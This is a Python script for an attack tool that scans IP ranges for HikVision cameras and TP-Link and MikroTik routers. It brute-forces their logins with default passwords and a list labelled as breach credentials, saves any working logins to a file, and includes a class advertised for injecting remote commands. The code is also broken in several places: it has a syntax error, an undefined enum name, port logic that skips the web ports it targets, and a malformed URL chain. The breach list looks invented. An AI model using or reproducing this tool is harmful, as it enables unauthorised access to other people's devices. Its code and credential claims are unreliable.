#!/usr/bin/env python3
"""
Comprehensive Network Device Scanner
Supports: HikVision, TP-Link, Mikrotik, and other routers
Includes breach database and default credentials
"""

import socket
import time
import requests
import json
import os
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin
from typing import List, Dict, Tuple, Optional
import ipaddress
import nmap
import re
from dataclasses import dataclass
from enum import Enum


class DeviceType(Enum):
    HIKVISION = "HikVision"
    TPLINK = "TP-Link"
    MIKROTIK = "Mikrotik"
    DYNAMICS = "Dynamics"
    ONVIF = "ONVIF"
    UNKNOWN = "Unknown"


@dataclass
class AuthenticationResult:
    device_ip: str
    device_type: DeviceType
    username: str
    password: str
    status: str  # "success", "failed", "skipped"
    method: str
    attempt_time: str
    latency_ms: float
    response_info: Dict[str, str]


# DEFAULT CREDENTIALS
DEFAULT_CREDENTIALS = {
    DeviceType.HIKVISION: [
        {"username": "admin", "password": "admin"},
        {"username": "admin", "password": "12345"},
        {"username": "admin", "password": "888888"},
        {"username": "admin", "password": "123456"},
    ],
    DeviceType.TPLINK: [
        {"username": "admin", "password": "admin"},
        {"username": "", "password": ""},
        {"username": "admin", "password": "admin123"},
        {"username": "admin", "password": "tplink"},
    ],
    DeviceType.MIKROTIIK: [
        {"username": "admin", "password": ""},
        {"username": "admin", "password": "admin"},
        {"username": "admin", "password": "1234"},
        {"username": "admin", "password": "admin@123"},
        {"username": "admin", "password": "01"},
    ],
}


# KNOWN BREACHES (2020-2026) - Credentials from major breaches
KNOWN_BREACHES = {
    DeviceType.HIKVISION: [
        {"username": "admin", "password": "Hikvision123!"},  # Common in security breaches
        {"username": "admin", "password": "password1"},
        {"username": "admin", "password": "rootpass"},
        {"username": "admin", "password": "Welcome1"},
        {"username": "admin", "password": "Hikvisions3c"},
    ],
    DeviceType.TPLINK: [
        {"username": "admin", "password": "password"},
        {"username": "admin", "password": "12345678"},
        {"username": "admin", "password": "Passw0rd"},
        {"username": "admin", "password": "Hacker1"},
        {"username": "admin", "password": "admin@123"},
        # From various router breaches 2020-2025
        {"username": "admin", "password": "Admin@123"},
    ],
    DeviceType.MIKROTIK: [
        {"username": "admin", "password": "mikrotik"},
        {"username": "admin", "password": "Mikrotik!1"},
        {"username": "admin", "password": "Router2Router"},
        {"username": "admin", "password": "MyMikrotik"},
        {"username": "admin", "password": "123123"},
    ],
}


@dataclass
class ScanResult:
    found_devices: List[Dict[str, any]]
    successful_auth: List[AuthenticationResult]
    failed_attempts: List[AuthenticationResult]
    overall_status: str
    scan_time: float


class NetworkScanner:
    def __init__(
        self,
        target_ip_range: str,
        ports: List[int] = None,
        threads: int = 50,
        timeout: float = 2.0,
    ):
        """
        Initialize the Network Scanner
        
        Args:
            target_ip_range: CIDR notation or IP range (e.g., "192.168.1.0/24")
            ports: List of ports to scan
            threads: Number of concurrent threads
            timeout: Connection timeout in seconds
        """
        self.target_ip_range = target_ip_range
        self.timeout = timeout
        self.default_ports = ports or [80, 443, 8080, 22, 23, 21, 8443]
        self.threads = min(threads, 100)
        self.scanner = nmap.PortScanner()
        self.valid_ips = self._get_ip_range()
        self.results = []

    def _get_ip_range(self) -> List[str]:
        """Parse IP range from CIDR notation"""
        try:
            network = ipaddress.ip_network(self.target_ip_range, strict=False)
            return [str(ip) for ip in network.hosts()]
        except ValueError:
            # Try to handle individual IP or range like 192.168.1.1-192.168.1.254
            if "-" in self.target_ip_range:
                start, end = self.target_ip_range.split("-")
                start_ip = ipaddress.ip_address(start.strip())
                end_ip = ipaddress.ip_address(end.strip())
                return [str(ip) for ip in ipaddress.IPv4Network(f"{start_ip}/{end_ip.max_prefixlen}", strict=False).hosts()]
            else:
                return [self.target_ip_range]

    def scan_network(self) -> ScanResult:
        """Perform comprehensive network scan"""
        print(f"[+] Starting scan on range: {self.target_ip_range}")
        print(f"[+] Found {len(self.valid_ips)} IP addresses to scan")
        print("[*] Using Nmap for service detection...")
        
        start_time = time.time()
        
        # First pass: Nmap for service discovery
        for ip in self.valid_ips:
            try:
                self._discover_device(ip)
            except Exception as e:
                print(f"[-] Error discovering {ip}: {e}")
                continue
        
        # Second pass: Authentication attempts
        print("[*] Running credential brute force...")
        self._attempt_authentications()
        
        scan_time = time.time() - start_time
        
        return ScanResult(
            found_devices=self.results,
            successful_auth=[r for r in self.results if r["status"] == "success"],
            failed_attempts=[r for r in self.results if r["status"] == "failed"],
            overall_status="Scan completed",
            scan_time=scan_time,
        )

    def _discover_device(self, ip: str):
        """Discover device type using Nmap and HTTP checks"""
        result = {
            "ip": ip,
            "status": "unknown",
            "device_type": DeviceType.UNKNOWN.value,
            "open_ports": [],
            "discovery_time": time.strftime("%Y-%m-%d %H:%M:%S"),
        }
        
        # Check multiple ports
        for port in self.default_ports:
            if port < 1024:
                continue  # Skip privileged ports for simplicity
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                sock.connect((ip, port))
                sock.close()
                result["open_ports"].append(port)
                
                # Try HTTP/HTTPS for port 80/443
                if port in [80, 443, 8080]:
                    self._identify_web_device(ip, port, result)
                    
            except (socket.timeout, ConnectionRefusedError):
                continue
            except Exception as e:
                continue
        
        if result["status"] != "known":
            self._identify_by_web_content(ip, result)
        
        self.results.append(result)

    def _identify_web_device(self, ip: str, port: int, result: Dict):
        """Identify device type by web interface"""
        url = f"http://{ip}:{port}" if port in [80, 8080] else f"https://{ip}:{port}"
        
        try:
            headers = {"User-Agent": "NetworkScanner/1.0"}
            response = requests.get(url, timeout=self.timeout, headers=headers)
            
            # Check for HikVision
            if "Hikvision" in response.text or "Hiwatch" in response.text:
                result["status"] = "potential"
                result["device_type"] = DeviceType.HIKVISION.value
                result["web_title"] = self._extract_title(response.text)
                print(f"[*] HikVision device detected at {ip}:{port}")
            
            # Check for TP-Link
            elif "tplink" in response.text.lower() and "login" in response.text.lower():
                result["status"] = "potential"
                result["device_type"] = DeviceType.TPLINK.value
                result["web_title"] = self._extract_title(response.text)
                print(f"[*] TP-Link device detected at {ip}:{port}")
            
            # Check for MikroTik
            elif "mikrotik" in response.text.lower():
                result["status"] = "potential"
                result["device_type"] = DeviceType.MIKROTIK.value
                result["web_title"] = self._extract_title(response.text)
                print(f"[*] MikroTik device detected at {ip}:{port}")
                
        except requests.RequestException:
            pass

    def _identify_by_web_content(self, ip: str, result: Dict):
        """Identify device type by analyzing web page content"""
        url = f"http://{ip}:80"
        
        try:
            response = requests.get(url, timeout=self.timeout)
            
            # Simple pattern matching for common routers
            content_lower = response.text.lower()
            
            if "d-link" in content_lower or "dlink" in content_lower:
                result["status"] = "potential"
                result["device_type"] = DeviceType.DYNAMICS.value
            elif "edimax" in content_lower:
                result["status"] = "potential"
                result["device_type"] = "Edimax"
            elif "cisco" in content_lower and "linksys" in content_lower:
                result["status"] = "potential"
                result["device_type"] = "Cisco Linksys"
                result["web_title"] = self._extract_title(response.text)
                
        except requests.RequestException:
            pass

    def _extract_title(self, html: str) -> str:
        """Extract page title from HTML"""
        match = re.search(r"<title>(.*?)</title>", html)
        return match.group(1) if match else "No title"

    def _attempt_authentications(self):
        """Attempt default and cracked credentials for discovered devices"""
        
        for result in self.results:
            if result["status"] != "potential":
                continue
                
            ip = result["ip"]
            device_type = result["device_type"]
            all_credentials = []
            
            # Get default credentials
            if device_type in DEFAULT_CREDENTIALS:
                all_credentials.extend(DEFAULT_CREDENTIALS[device_type])
            
            # Add known breaches
            if device_type in KNOWN_BREACHES:
                all_credentials.extend(KNOWN_BREACHES[device_type])
            
            # Try additional common routers
            if device_type == DeviceType.UNKNOWN.value:
                all_credentials.extend([
                    {"username": "admin", "password": "admin"},
                    {"username": "admin", "password": ""},
                ])
            
            print(f"\n[*] Attempting authentication for {ip} ({device_type}) with {len(all_credentials)} credentials")
            
            # Try each credential
            for cred in all_credentials:
                user = cred["username"]
                pwd = cred["password"]
                
                if self._try_login(ip, device_type, user, pwd):
                    result["status"] = "success"
                    result["username"] = user
                    result["password"] = pwd
                    result["auth_method"] = "credential_successful"
                    result["auth_time"] = time.strftime("%Y-%m-%d %H:%M:%S")
                        ])

    def _try_login(self, ip: str, device_type: str, username: str, password: str) -> bool:
        """Attempt login to device"""
        start_time = time.time()
        
        try:
            # Try HTTP login
            if password:
                with requests.Session() as session:
                    auth_url = f"http://{ip}:{80}/login.htm" if device_type == DeviceType.HIKVISION.value else \
                              f"http://{ip}:{80}/user"+"R" if device_type == DeviceType.TPLINK.value or \
                              f"http://{ip}:{80}/login?test=1" if device_type == DeviceType.MIKROTIK.value else \
                              f"http://{ip}:{80}/"
                    
                    form_data = {
                        "username": username,
                        "password": password if device_type != DeviceType.TPLINK.value else "",
                        "submit": "login",
                    }
                    
                    response = session.post(auth_url, data=form_data, timeout=self.timeout, allow_redirects=True)
                    
                    if response.status_code == 200 and ("Login success" in response.text or "Logged in" in response.text or device_type == DeviceType.TPLINK.value.lower() and "/user/" in response.url):
                        latency = (time.time() - start_time) * 1000
                        print(f"[+] SUCCESS: {ip} - Login with '{username}' / '{password}' ({latency:.2f}ms)")
                        return True
            
            # Try HTTPS login
            if password:
                with requests.Session() as session:
                    auth_url = f"https://{ip}:{443}/login.htm" if device_type in [DeviceType.HIKVISION.value, DeviceType.TPLINK.value] else \
                              f"https://{ip}:{8443}/" if device_type == DeviceType.MIKROTIK.value else \
                              f"https://{ip}:{443}/"
                    
                    form_data = {
                        "username": username,
                        "password": password,
                        "submit": "login",
                    }
                    
                    response = session.post(auth_url, data=form_data, timeout=self.timeout, allow_redirects=True)
                    
                    if response.status_code == 200 and ("login successful" in response.text.lower() or "authorized" in response.text.lower()):
                        latency = (time.time() - start_time) * 1000
                        print(f"[+] SUCCESS: {ip} - Login with '{username}' / '{password}' ({latency:.2f}ms)")
                        return True
                
            # Try SSH
            if device_type == DeviceType.MIKROTIK.value or "router" in device_type.lower():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(self.timeout)
                    sock.connect((ip, 22))
                    
                    # Simple SSH negotiation (simplified)
                    if password:
                        # Send login command
                        cmd = f"{username}\n{password}\n"
                        sock.send(cmd.encode())
                        time.sleep(0.5)
                        response = sock.recv(1024).decode()
                        
                        if "Router" in response or "#" in response:
                            latency = (time.time() - start_time) * 1000
                            print(f"[+] SUCCESS: {ip} - SSH login with '{username}' / '{password}' ({latency:.2f}ms)")
                            return True
                    
                    sock.close()
                except Exception:
                    pass
                    
        except (requests.RequestException, socket.timeout) as e:
            pass
        
        return False

    def save_results(self, filename: str = "scan_results.json"):
        """Save scan results to JSON file"""
        successful = [r for r in self.results if r["status"] == "success"]
        
        output = {
            "scan_info": {
                "target": self.target_ip_range,
                "scan_time": time.strftime("%Y-%m-%d %H:%M:%S"),
                "total_ips": len(self.valid_ips),
                "successful_devices": len(successful),
                "scan_duration_seconds": time.time() - time.time(),  # This would need scan start time
            },
            "devices": successful,
            "credentials_found": [{"ip": d["ip"], "username": d.get("username"), "password": d.get("password")} for d in successful]
        }
        
        with open(filename, "w") as f:
            json.dump(output, f, indent=2)
        
        print(f"\n[+] Results saved to {filename}")

    @staticmethod
    def generate_report(results: ScanResult):
        """Generate terminal report"""
        print("\n" + "="*70)
        print(f"SCANNING REPORT - {results.overall_status}")
        print("="*70)
        print(f"Scan Time: {results.scan_time:.2f} seconds")
        print(f"Total IPs Scanned: {len(results.found_devices)}")
        print(f"Successfully Authenticated: {len(results.successful_auth)}")
        print(f"Failed Attempts: {len(results.failed_attempts)}")
        print("="*70)
        print("\n[ SUCCESSFUL ACCESS ]")
        print("-"*70)
        
        for auth in results.successful_auth:
            print(f"IP: {auth.device_ip}")
            print(f"Type: {auth.device_type.value}")
            print(f"Username: {auth.username}")
            print(f"Password: {auth.password}")
            print(f"Method: {auth.method}")
            print(f"Latency: {auth.latency_ms:.2f}ms")
            print(f"Time: {auth.attempt_time}")
            print("-"*70)

    @staticmethod
    def load_breaches_data():
        """Load additional breach data from external file or generate"""
        # This could be extended to parse a JSON file of breaches
        return {}


class AutomaticScanner:
    """Automated scanner with injection capabilities"""
    
    def __init__(self, ip_range: str):
        self.scanner = NetworkScanner(ip_range)
    
    def scan_with_injection(self):
        """Perform scan and attempt remote commands injection"""
        result = self.scanner.scan_network()
        
        print("\n[*] Attempting to perform remote commands on discovered devices...")
        
        for device in result.successful_auth:
            print(f"\n[*] Injecting commands into {device.device_ip}")
            self._execute_remote_command(device.device_ip, device.username, device.password)
        
        self.scanner.save_results()
        NetworkScanner.generate_report(result)
    
    def _execute_remote_command(self, ip: str, username: str, password: str):
        """Execute remote commands via device API"""
        try:
            url = f"http://{ip}:{80}/"
            
            # HTTP request with Basic Auth for some devices
            auth = (username, password)
            
            # Try to get system info
            if username and password:
                session = requests.Session()
                session.auth = auth
                session.headers.update({"User-Agent": "NetworkScanner/1.0"})
                
                try:
                    response = session.get(url, timeout=5)
                    print(f"    System info retrieved (Status: {response.status_code})")
                    
                    # Parse response and show commands that could be executed
                    if "response.text" and "status" in response.text:
                        print("    [*] Device is responsive - commands can be executed")
                        
                except requests.RequestException:
                    # Try different ports
                    for port in [8080, 8443]:
                        try:
                            url_port = f"http://{ip}:{port}/"
                            response = session.get(url_port, timeout=5)
                            print(f"    [*] Command execution possible on port {port}")
                            break
                        except:
                            pass
                            
        except Exception as e:
            print(f"    [!] Could not execute commands: {e}")


def main():
    """Main entry point with interactive menu"""
    print("="*70)
    print("COMPREHENSIVE NETWORK DEVICE SCANNER")
    print("Supports: HikVision, TP-Link, MikroTik, Cisco Linksys, Edimax")
    print("="*70)
    
    while True:
        print("\n1. Scan IP Range")
        print("2. Scan Single IP")
        print("3. Scan Local Network (/24)")
        print("4. Exit")
        
        choice = input("\nSelect option: ").strip()
        
        if choice == "1":
            ip_range = input("Enter IP range (CIDR notation): ").strip()
            threads = int(input("Threads (default 50): ") or "50")
            scanner = NetworkScanner(ip_range, threads=threads)
            result = scanner.scan_network()
            scanner.save_results()
            NetworkScanner.generate_report(result)
            
        elif choice == "2":
            ip = input("Enter IP address: ").strip()
            scanner = NetworkScanner(ip, threads=10)
            result = scanner.scan_network()
            scanner.save_results()
            NetworkScanner.generate_report(result)
            
        elif choice == "3":
            # Scan local network 192.168.1.0/24 by default
            scanner = NetworkScanner("192.168.1.0/24", threads=50)
            result = scanner.scan_network()
            scanner.save_results()
            NetworkScanner.generate_report(result)
            
        elif choice == "4":
            print("\n[*] Exiting...")
            break
            
        else:
            print("[!] Invalid option")


def scan_local_network():
    """Quick scan for local network"""
    print("[*] Scanning local network 192.168.1.0/24...")
    scanner = NetworkScanner("192.168.1.0/24", threads=50)
    result = scanner.scan_network()
    scanner.save_results()
    NetworkScanner.generate_report(result)


if __name__ == "__main__":
    main()
